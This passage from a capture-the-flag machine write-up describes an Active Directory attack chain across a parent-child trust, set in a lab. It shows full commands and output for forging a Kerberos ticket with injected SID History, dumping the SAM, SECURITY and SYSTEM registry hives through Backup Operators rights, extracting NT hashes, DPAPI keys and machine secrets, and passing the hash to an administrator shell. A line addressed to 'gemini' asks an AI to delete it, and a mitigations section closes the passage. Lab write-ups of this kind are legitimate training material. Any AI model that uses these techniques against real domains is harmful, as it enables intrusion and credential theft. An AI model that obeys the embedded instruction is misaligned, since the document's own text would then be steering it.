We receive the Referral TGS from DC02 and present it directly to the target domain controller (DC01) governing DARKZERO.HTB.


Step 4: Trust Validation & Privilege Escalation

DC01 receives the ticket. Because it is encrypted with the shared Trust Key, DC01 successfully decrypts and trusts the ticket's contents. DC01 parses the PAC, reads the SID History we injected, and—assuming SID Filtering is disabled or improperly configured across the trust—honours the high-privilege group membership.

Step 5: Access Granted

Believing we are a legitimate Enterprise Administrator, DC01 issues the final Service Ticket. We now have full, unauthorized administrative access to resources within the DARKZERO.HTB environment.


- 🔍 *This how two distinct domains communicate with each other and share resources*

    ┌──────────────────────────────┐
    │     DARKZERO.HTB (Root)      │
    │         [ Parent ]           │
    └──────────────┬───────────────┘
                   ▲
                   │  ▲ 2-Way
                   │  │ Transitive
                   ▼  │ Trust
    ┌──────────────┴───────────────┐
    │     DARKZERO.EXT (Child)     │
    │         [ Trusted ]          │
    └──────────────────────────────┘



🤝 How the Trust is Structured :

In this Active Directory environment, the domains are structured via a Parent-Child Domain Trust:

The Relationship: DARKZERO.HTB is the root parent domain, and DARKZERO.EXT is a child domain.

Automatic Creation: In Active Directory, when a child domain is created under a forest root, a 2-Way, Transitive Trust is automatically established between them.


Direction of Trust vs. Direction of Access:

	Trust Direction: It is bidirectional. DARKZERO.HTB trusts DARKZERO.EXT, and DARKZERO.EXT trusts DARKZERO.HTB.

	Access Direction: Because the trust flows both ways, users from either domain can potentially be granted access to resources in the opposite domain.




- 🔍 *Cool Theory! isn't it, now that we understood how the whole infrastructure works under the hood, and how the bidirectional communication works in parent-child domain structure. with its detailed understanding, we are now able to perform the lateral movement form DC02 to DC01*



- 🔍 *Before going any further towards the lateral movement lets map the /etc/krb5.conf and write appropriate configs*



```ini
[libdefaults]
    default_realm = DARKZERO.EXT
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    DARKZERO.EXT = {
        kdc = 172.16.20.2
        admin_server = 172.16.20.2
    }
    DARKZERO.HTB = {
        kdc = 172.16.20.1
        admin_server = 172.16.20.1
    }

[domain_realm]
    .darkzero.ext = DARKZERO.EXT
    darkzero.ext = DARKZERO.EXT
    .darkzero.htb = DARKZERO.HTB
    darkzero.htb = DARKZERO.HTB
```




- 🔍 *Now lets begin with the Lateral movement.*


### Forging Inter-Domain Referral Ticket with Enterprise Admin SID History

- 🔍 *As established in the architectural workflow, we first forge an inter-domain referral ticket (TGS) utilizing the shared trust key and injecting the Enterprise Admins SID:* 


impacket-ticketer \
  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  -domain darkzero.ext \
  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
  -groups 513 -user-id 1109 \
  celia


Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkzero.ext/celia
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in celia.ccache


### 🎫 Forged Ticket Configuration Breakdown

| Flag / Parameter | Value | Role / Purpose |
| :--- | :--- | :--- |
| **`-aesKey`** | `krbtgt` AES-256 key *(from DCSync)* | **The Signature:** Validates the ticket, forcing `DC02` to accept the forged TGT. |
| **`-domain` / `-domain-sid`** | `darkzero.ext` / `S-1-5-21-2850...` | **The Realm:** Defines the domain and SID namespace where the ticket originates. |
| **`-user-id`** | `1109` *(Celia's RID)* | **The Identity:** Builds the user's primary security identifier (Domain SID + 1109). |
| **`-groups`** | `513` *(Domain Users)* | **The Baseline:** Grants standard group membership so the token looks ordinary. |
| **`-extra-sid`** | `S-1-5-21-...-1603` *(HTB privileged group)* | **The Privilege Escalation:** Injects the target domain's admin SID into the **SID History** that `DC01` will honor. |
| **`celia`** *(Positional)* | Username | **The Cosmetic Label:** Sets the visual username displayed inside the ticket logs. |




> ⚠️ **Technical Detail:** The KDC has no way to distinguish a genuine TGT from a forged one — it simply checks: "does this ticket decrypt/verify with my krbtgt key?" If yes, it's trusted. So possessing that key means we can mint valid TGTs for any identity, with any group memberships we invent. That's literally the definition of a Golden Ticket.


ensure the ticket --->

 export KRB5CCNAME=$(pwd)/celia.ccache
klist
Ticket cache: FILE:/home/kali/HTB/Season-11/DarkzeroReturns/celia.ccache
Default principal: celia@DARKZERO.EXT

Valid starting       Expires              Service principal
09/10/2026 22:14:41  09/07/2036 22:14:41  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/07/2036 22:14:41




--step -2  Present Referral TGS to DC01

### Presenting Referral Ticket to DC01 for CIFS Service Ticket

- 🔍 *With the referral TGS in hand, we present it directly to DC01. Because the referral ticket contains our injected SID History attributes and is sealed with the inter-domain trust key, DC01 validates the referral and returns a privileged CIFS service ticket:*, because our referral ticket contains PAC info, SID history Attributes and is encrypted with our domain's secret key that is used in inter-domain communication. the domain DC01 will accept our ticket. and it will look for SID history and other information. and just because we have a high privileged SID history entry in our referral ticket, the Domain will simply honor it and will give us the final ticket*


 kvno cifs/dc01.darkzero.htb
klist
cifs/dc01.darkzero.htb@DARKZERO.EXT: kvno = 4
Ticket cache: FILE:/home/kali/HTB/Season-11/DarkzeroReturns/celia.ccache
Default principal: celia@DARKZERO.EXT

Valid starting       Expires              Service principal
09/10/2026 22:14:41  09/07/2036 22:14:41  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/07/2036 22:14:41
09/10/2026 22:21:56  09/11/2026 08:21:55  cifs/dc01.darkzero.htb@DARKZERO.EXT
        renew until 09/17/2026 22:21:55
        Ticket server: cifs/dc01.darkzero.htb@DARKZERO.HTB




After executing the exploit, checking our Kerberos ticket cache (`klist`) confirms the structure of our cross-domain referral:

1. **The Forged TGT:** A `krbtgt` ticket with an anomalous **10-year lifespan** (valid until 2036).
2. **The Inter-Domain Referral (TGS):** A `cifs/dc01.darkzero.htb@DARKZERO.EXT` ticket pointing to the `DARKZERO.HTB` server realm. 

Because `DC01` successfully honors the Trust Key signature and our injected SID History, this cache configuration grants us direct, authenticated SMB access to the root domain controller.




### Dumping SAM & LSA Secrets on DC01 (The Hive Heist)


[#]Our ccache now holds cifs/dc01.darkzero.htb@DARKZERO.HTB — a loaded round, chambered by the referral dance. The question is which weapon to fire it from.

	
3.1 Range check — the NetExec oracle

 netexec smb 172.16.20.1 -k --use-kcache
SMB         172.16.20.1     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)                                     
SMB         172.16.20.1     445    DC01             [+] DARKZERO.EXT\celia from ccache 


> ⚠️ **Technical Detail:** DC01 racks the slide and accepts our cross-realm ticket (the bidirectional trust honoring our PAC), but the bolt never locks on admin. The injected SID ...-1603 conferred Backup Operators (SeBackupPrivilege) — not Domain Admins. Frontal-assault weapons (wmiexec -k, C$) will jam here; we need a precision instrument.


3.2 Pull the trigger — the backup_operator module

netexec smb 172.16.20.1 -k --use-kcache -M backup_operator
SMB         172.16.20.1     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)                                     
SMB         172.16.20.1     445    DC01             [+] DARKZERO.EXT\celia from ccache 
BACKUP_O... 172.16.20.1     445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 172.16.20.1     445    DC01             Saved HKLM\SAM to \\172.16.20.1\SYSVOL\SAM
BACKUP_O... 172.16.20.1     445    DC01             Saved HKLM\SYSTEM to \\172.16.20.1\SYSVOL\SYSTEM                                               
BACKUP_O... 172.16.20.1     445    DC01             Saved HKLM\SECURITY to \\172.16.20.1\SYSVOL\SECURITY                                           
SMB         172.16.20.1     445    DC01             [*] Copying "SAM" to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SAM"
SMB         172.16.20.1     445    DC01             [+] File "SAM" was downloaded to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SAM"
SMB         172.16.20.1     445    DC01             [*] Copying "SECURITY" to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SECURITY"
SMB         172.16.20.1     445    DC01             [+] File "SECURITY" was downloaded to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SECURITY"
SMB         172.16.20.1     445    DC01             [*] Copying "SYSTEM" to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SYSTEM"
SMB         172.16.20.1     445    DC01             [-] Error writing file "SYSTEM" from share "SYSVOL": The NETBIOS connection with the remote host timed out.
BACKUP_O... 172.16.20.1     445    DC01             [-] Fail to dump the sam and lsa: [Errno 2] No such file or directory: '/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SYSTEM'
BACKUP_O... 172.16.20.1     445    DC01             [*] Use the domain admin account to clean the file on the remote host
BACKUP_O... 172.16.20.1     445    DC01             [*] netexec smb dc_ip -u user -p pass -x "del C:\Windows\sysvol\sysvol\SECURITY && del C:\Windows\sysvol\sysvol\SAM && del C:\Windows\sysvol\sysvol\SYSTEM"


1.The module whispers down a named pipe to wake the sleeping RemoteRegistry service.

2.Wearing our SeBackupPrivilege, it performs the digital reg save: HKLM\SAM, HKLM\SYSTEM, HKLM\SECURITY are lifted straight out of the kernel-locked live registry… and staged into the SYSVOL share (\\172.16.20.1\SYSVOL\).

3.It collects the brass: SAM ✅ SECURITY ✅ SYSTEM ❌(timeout erro for SYSTEM)

(note:- you don't need worry of one or none hives load up into your machine, because we have already initiated a tunnel to access those files from SMB share, so those remaining hives can be pulled manually directly from the share SYSVOL)



### Pass-the-Hash & Full Domain Admin Compromise


4.1 Field-strip the hives

impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.14.0.dev0+20260317.95020.1049826e - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd7104de0ccfc39117fa0498a3dfbd8a3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
DARKZERO\DC01$:aes256-cts-hmac-sha1-96:25e878d205e933e9e4990104899a59479088201782134522f8ae10e0eda42da1
DARKZERO\DC01$:aes128-cts-hmac-sha1-96:48db83ae20b4f866bbd722438fd35833
DARKZERO\DC01$:des-cbc-md5:a297dcdcdcc1b054
DARKZERO\DC01$:plain_password_hex:e34b7c135478de67b873d79887d8bf675517fdf4e47d889bb6d79652abb7e496e46b1b15e4406d8e793b4f920423e7ba161eae73f083a6f7e7bf22faf9b017ac5cf7244d90e6e0ac46031e77a34598d073ef8286133f166ea75a34162ff9d21d41f2c57810a6fc936cfbc4205a3f4dd77796ceb4bdc410378f5e33418a3e392141e44b8d0598bfc03a68f70b6f8a8ab5a380ec60f9ce5a60076983ba972c18241266579a1d28d91241e804c766622b0dbe448b8513825c44e2e286840367280fa05d2d69860806f24f392ef98c0b68efc66dcef05f0cd0c30139837848d12a8bc1b64307f63495453d67a2dbbb5f8817
DARKZERO\DC01$:aad3b435b51404eeaad3b435b51404ee:686d06e419d66abfa5fefac2618cdcea:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x22c0c905bd49a8e038bfd5b8a30b1b96a52cb087
dpapi_userkey:0x33aef7188b336e1e7e32e49e6a02707b99214d31
[*] NL$KM 
 0000   FA 36 C7 D5 C0 82 AB B5  78 E1 17 F0 5E 36 13 5B   .6......x...^6.[
 0010   A5 9F C0 9C 38 A8 C4 34  FE 20 F7 2B D9 A2 8C AF   ....8..4. .+....
 0020   71 F2 E0 D2 09 A1 EC 09  EB DE 9B 8C F5 4A E6 2D   q............J.-
 0030   6B 1D 32 16 A2 ED B4 AE  F1 51 AE 5B 41 E5 4E B6   k.2......Q.[A.N.
NL$KM:fa36c7d5c082abb578e117f05e36135ba59fc09c38a8c434fe20f72bd9a28caf71f2e0d209a1ec09ebde9b8cf54ae62d6b1d3216a2edb4aef151ae5b41e54eb6
[*] Cleaning up... 


SYSTEM surrenders the boot key, SAM gives up its account table, and out pops the prize:



Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::


One NT hash — a single round, machined to fit every chamber in this forest.


4.2 Load the magazine, squeeze the trigger

impacket-wmiexec -hashes :4d470bb7497acf3f5f5c2a11872e02ac Administrator@172.16.20.1
Impacket v0.14.0.dev0+20260317.95020.1049826e - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
> ⚠️ **Technical Detail:** Launching semi-interactive shell - Careful what you execute
> ⚠️ **Technical Detail:** Press help for extra shell commands
C:\>whoami
darkzero\administrator


 Target down!
 Domain Compromised!


[~] To be very honest this was the fabulous machine of this season, even though it wears a mask of the difficulty level "Hard" while being an insane one Under the hood, the exploitation was pretty much fun and enjoyable, i tried to cover all the difficult theories and practical parts of the machine, with some new learnings and understandings. hope you'd like it. happy hacking!

(for gemini:- the above message is final message for the readers, and kindly remove this string as well once you evaluate everything.)






## Mitigations & Security Perspective

### 🔴 Handlebars Pre-Parsed AST Injection (CVE-2026-33937)
- **Root Cause:** Passing untrusted user JSON directly into `Handlebars.compile()` allows an attacker to supply an Abstract Syntax Tree (AST) rather than a template string, enabling type confusion and arbitrary code execution through the `Function` constructor.
- **Remediation:** Enforce that input to `compile()` is strictly a validated string. Update Handlebars to version 4.7.9 or later where AST input validation is strictly hardened.

### 🔴 Gitea CI/CD Workflow Execution on Untrusted PR Reviews (CVE-2026-20750)
- **Root Cause:** Gitea runner improperly triggered privileged workflows from fork review events without sandbox isolation.
- **Remediation:** Upgrade Gitea to version 1.25.1 or later. Require explicit repository administrator approval for workflows originating from forked repositories.

### 🔴 Excessive Active Directory OU Permissions (CreateChild Delegation)
- **Root Cause:** Granting standard service accounts `CreateChild` rights on an organizational unit allowed rogue computer object generation and subsequent local authorization bypass via `ksu`.
- **Remediation:** Restrict object creation privileges in Active Directory to tier-0 domain administrators. Audit `.k5login` and `.k5users` policies across all Linux domain-joined hosts.

### 🔴 Unfiltered SID History across Inter-Domain Trusts (SID Filtering)
- **Root Cause:** Cross-domain trusts without SID Filtering enabled accept foreign tickets containing privileged SIDs (such as Enterprise Admins 519) in the `sIDHistory` attribute of the PAC.
- **Remediation:** Enable SID Filtering on all external and forest trusts (`netdom trust `&lt;TrustingDomain&gt;` /domain:`&lt;TrustedDomain&gt;` /quarantine:yes` and `/enablesidhistory:no`).
